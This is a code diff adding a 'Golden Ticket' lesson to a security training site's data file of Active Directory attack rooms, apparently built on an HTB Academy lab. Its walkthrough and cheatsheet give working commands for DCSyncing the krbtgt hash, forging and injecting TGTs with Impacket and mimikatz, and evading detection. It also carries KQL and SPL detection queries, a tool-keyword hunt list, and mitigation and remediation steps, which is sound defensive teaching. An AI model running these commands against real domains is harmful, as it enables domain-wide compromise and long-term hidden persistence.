@@ -10,6 +10,8 @@ import adKerberoastHero from '@/assets/ad-kerberoast-hero.jpg';
 import adKerberoastFlow from '@/assets/ad-kerberoast-flow.jpg';
 import adSilverTicketHero from '@/assets/ad-silverticket-hero.jpg';
 import adSilverTicketFlow from '@/assets/ad-silverticket-flow.jpg';
+import adGoldenTicketHero from '@/assets/ad-goldenticket-hero.jpg';
+import adGoldenTicketFlow from '@/assets/ad-goldenticket-flow.jpg';
 
 export interface MitreTechnique {
   id: string;
@@ -1374,6 +1376,250 @@ export const adAttackRooms: AdAttackRoom[] = [
       { title: 'MITRE ATT&CK T1558.002', url: 'https://attack.mitre.org/techniques/T1558/002/' },
       { title: 'Microsoft — Group Managed Service Accounts', url: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview' },
       { title: 'SpecterOps — A Case Study in Wagging the Dog (Silver/Golden)', url: 'https://posts.specterops.io/' },
+    ],
+  },
+  // ======================= GOLDEN TICKET =======================
+  {
+    id: 'ad-golden-ticket',
+    slug: 'ad-golden-ticket',
+    name: 'Golden Ticket — Forging TGTs with the krbtgt Hash',
+    shortName: 'Golden Ticket',
+    category: 'Persistence',
+    severity: 'Critical',
+    difficulty: 'Insane',
+    publishedAt: '2025-05-12',
+    author: 'Ahmed Tareq',
+    readingTime: 15,
+    labProvider: 'HackTheBox',
+    labName: 'Kerberos Attacks — HTB Academy',
+    labUrl: 'https://academy.hackthebox.com/module/details/143',
+    coverImage: adGoldenTicketHero,
+    summary:
+      'A Golden Ticket is a forged Kerberos TGT signed with the krbtgt account NT hash. Because every TGS in the domain is built from a TGT the KDC trusts, owning the krbtgt hash means owning the forest — the attacker can impersonate any user (including non-existent ones) for any service, with a default ticket lifetime of 10 years. It is the apex AD persistence technique.',
+    prerequisites: [
+      'Domain Admin (or DCSync rights) — required to extract the krbtgt NT hash.',
+      'Domain SID (S-1-5-21-...) and FQDN of the target domain.',
+      'krbtgt NT hash or AES256 key (preferred — survives RC4 disable).',
+      'Mimikatz on Windows OR Impacket ticketer.py on Linux.',
+    ],
+    attackFlow: [
+      'Compromise a Domain Admin (phishing, Kerberoast → DA, ADCS ESC, BloodHound path).',
+      'DCSync the krbtgt account to extract its NT / AES256 hash.',
+      'Collect the domain SID.',
+      'Forge a TGT offline impersonating any user (often a fake account) with Domain Admin SIDs in the PAC.',
+      'Inject the TGT into the current session (kerberos::ptt or KRB5CCNAME).',
+      'Use the TGT to request TGS for any service in the domain — the KDC validates because the signature matches krbtgt.',
+      'Maintain stealth persistence for years until krbtgt is rotated TWICE.',
+    ],
+    walkthrough: [
+      {
+        title: 'Step 1 — DCSync the krbtgt hash',
+        description:
+          'Once you reach Domain Admin (or any account with Replicating Directory Changes / All rights), you can ask the DC to replicate the krbtgt secrets to you — no LSASS dump on the DC needed. secretsdump.py with -just-dc-user pulls only krbtgt to keep the noise down.',
+        commands: [
+          'secretsdump.py -just-dc-user krbtgt INLANEFREIGHT.LOCAL/administrator@10.10.10.161',
+        ],
+        output: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9b1d1b3a8c6e4f9d2e0b1c5a7f8d9e3a:::\nkrbtgt:aes256-cts-hmac-sha1-96:7e2c4d...c1a',
+        image: { src: adGoldenTicketFlow, caption: 'Golden Ticket: forged TGT signed with krbtgt → KDC trusts it → TGS for any service.' },
+      },
+      {
+        title: 'Step 2 — Collect domain SID',
+        description:
+          'The PAC SIDs in the forged TGT must attach to the real domain SID prefix. Pull it once and reuse for every Golden Ticket you forge in this domain.',
+        commands: [
+          'lookupsid.py INLANEFREIGHT.LOCAL/administrator:Pass\\!@10.10.10.161 0 | grep "Domain SID"',
+          '# Or from any joined host:\nwhoami /user',
+        ],
+        output: 'Domain SID: S-1-5-21-3842939050-3880317879-2865463114',
+      },
+      {
+        title: 'Step 3 — Forge the Golden TGT (Linux / Impacket)',
+        description:
+          'ticketer.py builds a fully formed TGT, signs it with the krbtgt key and stuffs the PAC with whatever group SIDs we like. Impersonating a fake user (e.g. "totallyNotABackdoor") makes the ticket invisible to user-based hunting queries.',
+        commands: [
+          'ticketer.py -nthash 9b1d1b3a8c6e4f9d2e0b1c5a7f8d9e3a \\\n  -domain-sid S-1-5-21-3842939050-3880317879-2865463114 \\\n  -domain INLANEFREIGHT.LOCAL \\\n  -user-id 500 -groups 512,513,518,519,520 \\\n  totallyNotABackdoor',
+        ],
+        output: '[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for INLANEFREIGHT.LOCAL/totallyNotABackdoor\n[*] PAC_LOGON_INFO\n[*] PAC_CLIENT_INFO_TYPE\n[*] EncTicketPart\n[*] EncAsRepPart\n[*] Saving ticket in totallyNotABackdoor.ccache',
+      },
+      {
+        title: 'Step 4 — Forge from Windows (Mimikatz)',
+        description:
+          'On a Windows beachhead, mimikatz kerberos::golden builds and optionally injects the TGT in one go. /ptt loads it directly into the current logon session — zero disk artefacts, ready to use immediately.',
+        commands: [
+          'mimikatz # privilege::debug',
+          'mimikatz # kerberos::golden /user:Administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-3842939050-3880317879-2865463114 /krbtgt:9b1d1b3a8c6e4f9d2e0b1c5a7f8d9e3a /id:500 /groups:512,513,518,519,520 /ptt',
+          'mimikatz # misc::cmd',
+        ],
+        output: 'Golden ticket for "Administrator @ INLANEFREIGHT.LOCAL" successfully submitted for current session',
+      },
+      {
+        title: 'Step 5 — Use the TGT against any service',
+        description:
+          'Once the TGT is in cache, every Kerberos request is signed with krbtgt — the KDC issues TGS for any SPN. We can DCSync, dump SAM on every host, copy NTDS.dit, anything.',
+        commands: [
+          'export KRB5CCNAME=$PWD/totallyNotABackdoor.ccache',
+          'psexec.py -k -no-pass INLANEFREIGHT.LOCAL/totallyNotABackdoor@dc01.inlanefreight.local',
+          'secretsdump.py -k -no-pass dc01.inlanefreight.local',
+        ],
+        output: 'Impacket v0.11.0 ...\n[*] Requesting shares on dc01.inlanefreight.local.....\nNT AUTHORITY\\SYSTEM',
+      },
+      {
+        title: 'Step 6 — Long-term persistence',
+        description:
+          'Default Golden Ticket lifetime is 10 years. Even if the compromised DA password is reset and Domain Admins are cleaned out, the Golden Ticket survives — until krbtgt is rotated TWICE (must be twice because the DC keeps the previous key for the krbtgtKeyVersionNumber to handle in-flight tickets).',
+        commands: [
+          '# Detection-evading variant — set lifetime to default (10h) to blend with normal tickets\nticketer.py -nthash <hash> -domain-sid <SID> -domain DOMAIN -duration 10 backdoorAdmin',
+        ],
+      },
+    ],
+    commandsCheatsheet: [
+      { title: 'Impacket — DCSync krbtgt', command: 'secretsdump.py -just-dc-user krbtgt DOMAIN/admin@<DC>' },
+      { title: 'Impacket — domain SID', command: 'lookupsid.py DOMAIN/user:pass@<DC> 0 | grep "Domain SID"' },
+      { title: 'Impacket — forge Golden TGT', command: 'ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain DOMAIN -user-id 500 -groups 512,513,518,519,520 fakeuser' },
+      { title: 'Mimikatz — forge + inject', command: 'kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /krbtgt:<hash> /id:500 /groups:512,513,518,519,520 /ptt' },
+      { title: 'Use Golden ticket', command: 'export KRB5CCNAME=ticket.ccache && psexec.py -k -no-pass DOMAIN/user@dc01' },
+      { title: 'Reset krbtgt (twice!)', command: 'Reset-KrbtgtKeyInteractive.ps1 -Mode 4   # run twice, 10h apart' },
+    ],
+    commandExplanations: [
+      {
+        command: 'secretsdump.py -just-dc-user krbtgt DOMAIN/administrator@<DC>',
+        purpose: 'DCSync only the krbtgt account to extract its NT and AES keys — quietest way to grab the keys to the kingdom.',
+        breakdown: [
+          { flag: '-just-dc-user krbtgt', meaning: 'Replicate secrets for only one principal — minimal noise vs full DCSync.' },
+          { flag: 'DOMAIN/administrator@<DC>', meaning: 'Authentication context — must be DA or hold Replicating Directory Changes / All.' },
+        ],
+        why: 'Full secretsdump pulls every account (slow, very loud, often alerts EDR). -just-dc-user krbtgt is surgical — one MS-DRSR call, one account in the output.',
+      },
+      {
+        command: 'ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain DOMAIN -user-id 500 -groups 512,513,518,519,520 fakeuser',
+        purpose: 'Forge a Kerberos TGT offline signed with the krbtgt key, with arbitrary user identity and group SIDs.',
+        breakdown: [
+          { flag: '-nthash', meaning: 'krbtgt NT hash — used as the encryption + signing key for the forged TGT.' },
+          { flag: '-domain-sid', meaning: 'Domain SID prefix (the PAC group SIDs concatenate to this).' },
+          { flag: '-user-id 500', meaning: 'RID 500 = built-in Administrator. Many SIEMs alert on impersonation of the real Administrator — use a custom RID + fake username for stealth.' },
+          { flag: '-groups 512,513,518,519,520', meaning: 'Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creator Owners — full forest takeover SIDs.' },
+          { flag: 'fakeuser', meaning: 'The username string baked into the ticket. Can be ANY string — even users that do not exist.' },
+        ],
+        why: 'Because the KDC only verifies that the TGT was encrypted with the current krbtgt key, every PAC SID we list is granted with no further validation. The username can be totally fictional.',
+      },
+      {
+        command: 'kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /krbtgt:<hash> /id:500 /groups:512,513,518,519,520 /ptt',
+        purpose: 'Mimikatz one-liner that forges and injects the Golden TGT into the current logon session.',
+        breakdown: [
+          { flag: '/krbtgt', meaning: 'krbtgt NT hash (RC4) used to sign the TGT.' },
+          { flag: '/aes256', meaning: 'Alternative — sign with AES256 key (harder to detect since RC4 looks suspicious in AES-only environments).' },
+          { flag: '/id:500', meaning: 'RID for the impersonated principal (500 = built-in Administrator).' },
+          { flag: '/ptt', meaning: 'Pass-The-Ticket — inject straight into LSA without writing a .kirbi file to disk.' },
+          { flag: '/endin /renewmax /startoffset', meaning: 'Optional flags to shrink ticket lifetime so it blends with normal 10-hour TGTs.' },
+        ],
+        why: 'In-memory injection avoids disk artefacts and keeps the ticket scoped to the running shell — when the process exits, the ticket vanishes, leaving almost no forensic trace.',
+      },
+    ],
+    toolsExplained: [
+      { name: 'Impacket — secretsdump.py', category: 'Credential Access', purpose: 'DCSync the krbtgt hash from a non-DC host.', why: 'Single command, no LSASS interaction, works from any host with DA creds.', link: 'https://github.com/fortra/impacket' },
+      { name: 'Impacket — ticketer.py', category: 'Kerberos Forgery', purpose: 'Forge Golden / Silver TGTs on Linux.', why: 'Cross-platform alternative to mimikatz; produces .ccache that any Impacket tool consumes.', link: 'https://github.com/fortra/impacket' },
+      { name: 'Mimikatz', category: 'Kerberos / Windows', purpose: 'Forge and pass-the-ticket natively on Windows.', why: 'kerberos::golden + /ptt is the canonical Golden Ticket workflow for two decades.', link: 'https://github.com/gentilkiwi/mimikatz' },
+      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Modern .NET ticket abuse (golden, silver, S4U).', why: 'Runs in-memory from C2; supports AES keys and stealthy ticket lifetimes.', link: 'https://github.com/GhostPack/Rubeus' },
+      { name: 'BloodHound', category: 'Path Mapping', purpose: 'Find the path from foothold → Domain Admin (the krbtgt prerequisite).', why: 'Golden Ticket needs DA first. BloodHound shortest-path queries (e.g. ShortestPathToDomainAdmins) reveal it instantly.', link: 'https://bloodhound.specterops.io' },
+      { name: 'Reset-KrbtgtKeyInteractive.ps1', category: 'Defense / IR', purpose: 'Microsoft-signed script for safe krbtgt double-rotation.', why: 'Rotating krbtgt the wrong way breaks every Kerberos auth in the forest. This script does it safely.', link: 'https://github.com/microsoft/New-KrbtgtKeys.ps1' },
+    ],
+    enumerationDetection: [
+      {
+        title: 'DCSync — krbtgt extraction precursor',
+        description: 'Every Golden Ticket starts with a DCSync of krbtgt. Watching 4662 with the DS-Replication-Get-Changes-All GUID from a non-DC account is the highest-fidelity precursor signal in the entire AD attack surface.',
+        eventIds: ['4662'],
+        dataSource: 'Domain Controller — Security log',
+        queryLanguage: 'KQL',
+        severity: 'Critical',
+        query: 'SecurityEvent\n| where EventID == 4662\n| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes\n   or  Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes-All\n   or  Properties has "89e95b76-444d-4c62-991a-0facbeda640c"  // DS-Replication-Get-Changes-In-Filtered-Set\n| where AccountName !endswith "$" and AccountName != "MSOL_*"',
+      },
+      {
+        title: 'Tooling on endpoints — secretsdump / mimikatz',
+        description: 'Catch the operator before they finish the job. Look for secretsdump.py / mimikatz strings in command lines and Sysmon Image Loaded events for samlib.dll + cryptdll.dll into non-LSASS processes.',
+        eventIds: ['4688', '4104', '7'],
+        dataSource: 'Endpoint — Sysmon / Defender',
+        queryLanguage: 'KQL',
+        severity: 'Critical',
+        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("secretsdump","just-dc-user","kerberos::golden","krbtgt","mimikatz","sekurlsa")',
+      },
+    ],
+    socDetection: [
+      {
+        title: 'Golden Ticket — TGS-REQ without preceding TGT (4769 without 4768)',
+        description: 'A real session always has a 4768 (TGT issued) preceding any 4769 (TGS issued). A Golden Ticket skips 4768 because the TGT was forged offline. So 4769 events for an account with NO matching 4768 in the last 10 hours = textbook Golden Ticket use.',
+        eventIds: ['4768', '4769'],
+        dataSource: 'Domain Controller — Security log',
+        queryLanguage: 'KQL',
+        severity: 'Critical',
+        query: 'let asReps = SecurityEvent\n| where EventID == 4768\n| project at=TimeGenerated, TargetUserName;\nlet tgsReqs = SecurityEvent\n| where EventID == 4769\n| where ServiceName !endswith "$"\n| project rt=TimeGenerated, TargetUserName, ServiceName, IpAddress;\ntgsReqs\n| join kind=leftanti asReps on TargetUserName\n   and $left.rt between ((at) .. (at + 10h))\n| where TargetUserName !in ("ANONYMOUS LOGON")',
+      },
+      {
+        title: 'Impossible / non-existent accounts in 4769',
+        description: 'Operators love to forge tickets for users that do not exist (totallyNotABackdoor). Cross-reference 4769 TargetUserName against AD — any name that is not in the directory is a guaranteed Golden Ticket.',
+        eventIds: ['4769'],
+        dataSource: 'Domain Controller + AD inventory',
+        queryLanguage: 'KQL',
+        severity: 'Critical',
+        query: 'let validUsers = IdentityInfo | distinct AccountName;\nSecurityEvent\n| where EventID == 4769\n| where TargetUserName !endswith "$"\n| join kind=leftanti validUsers on $left.TargetUserName == $right.AccountName\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress',
+      },
+      {
+        title: 'Anomalous ticket lifetime / encryption',
+        description: 'Default forged TGT lifetime is 10 years. Modern domains negotiate AES (0x12) — RC4 (0x17) on krbtgt-signed tickets is suspicious. Defender for Identity flags both natively.',
+        eventIds: ['4769', '4624'],
+        dataSource: 'Microsoft Defender for Identity',
+        queryLanguage: 'KQL',
+        severity: 'Critical',
+        query: 'IdentityLogonEvents\n| where Protocol == "Kerberos"\n| where AdditionalFields has "encryption_type:0x17"\n   or AdditionalFields has "ticket_lifetime > 10h"\n   or AdditionalFields has "ticket_renewal > 7d"',
+      },
+      {
+        title: 'krbtgt account activity baseline',
+        description: 'The krbtgt account itself should NEVER appear as a logon source. Any 4624 or 4768 with TargetUserName=krbtgt outside of a planned key-rotation window is a Tier-0 incident.',
+        eventIds: ['4624', '4768'],
+        dataSource: 'Domain Controller — Security log',
+        queryLanguage: 'SPL',
+        severity: 'Critical',
+        query: 'index=wineventlog (EventCode=4624 OR EventCode=4768) (Account_Name="krbtgt" OR Target_User_Name="krbtgt")\n| stats count by EventCode, Account_Name, Computer, Source_Network_Address',
+      },
+    ],
+    detection: [
+      'Correlate 4769 (TGS) with 4768 (TGT). TGS without a preceding TGT = Golden Ticket.',
+      'Alert on 4769 TargetUserName not present in AD inventory (forged fake users).',
+      'Microsoft Defender for Identity native: "Suspected Golden Ticket usage (forged authorization data)".',
+      'Hunt for DCSync (4662 with Replicating-Directory-Changes-All) — the krbtgt extraction precursor.',
+      'Process telemetry for secretsdump.py, mimikatz, kerberos::golden, krbtgt strings.',
+      'krbtgt account appearing in any 4624 / 4768 / 4769 outside a documented rotation window.',
+      'Kerberos tickets with non-default lifetime (>10h) or RC4 encryption in AES-only domains.',
+    ],
+    mitigation: [
+      'Tier-0 isolation: only Tier-0 admins can log into DCs; Tier-0 accounts never log into workstations.',
+      'Rotate krbtgt twice (10h apart) every 180 days as routine hygiene — kills any latent Golden Ticket.',
+      'Force AES-only Kerberos (msDS-SupportedEncryptionTypes = 0x18) so RC4 forged tickets stand out.',
+      'Enable Protected Users group for all Tier-0 accounts (no NTLM, no unconstrained delegation, 4h ticket lifetime).',
+      'Deploy Microsoft Defender for Identity / Azure ATP — it has purpose-built Golden Ticket detections.',
+      'Audit and remove unnecessary Replicating Directory Changes / All rights — only DCs and AAD Connect should have them.',
+    ],
+    remediation: [
+      'IMMEDIATELY reset krbtgt password TWICE with at least 10 hours between resets (use Microsoft-signed Reset-KrbtgtKeyInteractive.ps1).',
+      'Force-reset every Domain Admin and Tier-0 service account password.',
+      'Pull 1 year of 4768 / 4769 / 4624 logs and hunt for prior Golden Ticket use (orphan TGS, fake usernames).',
+      'Audit every change made by accounts in the suspect window — assume full forest compromise.',
+      'Rebuild any host the attacker authenticated to with the Golden Ticket; assume implant.',
+      'Review and remove all DCSync rights; restrict to DCs and Azure AD Connect only.',
+      'Consider rotating the entire forest trust + reissuing certificates if ADCS was reachable from the compromised tier.',
+    ],
+    mitre: [
+      { id: 'T1558.001', name: 'Golden Ticket', url: 'https://attack.mitre.org/techniques/T1558/001/' },
+      { id: 'T1003.006', name: 'OS Credential Dumping — DCSync', url: 'https://attack.mitre.org/techniques/T1003/006/' },
+      { id: 'T1550.003', name: 'Pass the Ticket', url: 'https://attack.mitre.org/techniques/T1550/003/' },
+      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
+    ],
+    tools: ['Impacket (secretsdump.py, ticketer.py, lookupsid.py)', 'Mimikatz', 'Rubeus', 'BloodHound', 'Reset-KrbtgtKeyInteractive.ps1'],
+    references: [
+      { title: 'HTB Academy — Kerberos Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
+      { title: 'MITRE ATT&CK T1558.001', url: 'https://attack.mitre.org/techniques/T1558/001/' },
+      { title: 'Microsoft — Reset the krbtgt account password', url: 'https://github.com/microsoft/New-KrbtgtKeys.ps1' },
+      { title: 'Sean Metcalf — Detecting Forged Kerberos Tickets', url: 'https://adsecurity.org/?p=1515' },
+      { title: 'SpecterOps — Kerberos Bronze Bit / Golden Ticket research', url: 'https://posts.specterops.io/' },
     ],
   },
 ];
